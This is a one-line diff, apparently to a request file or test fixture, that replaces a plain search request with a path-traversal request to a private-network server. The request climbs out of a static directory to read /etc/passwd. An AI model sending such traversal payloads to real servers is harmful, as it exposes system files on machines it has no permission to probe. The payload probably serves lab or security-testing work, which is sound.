@@ -1,1 +1,1 @@
-GET example.com/search
+GET 192.168.168.128:8081/static/../../../../etc/passwd
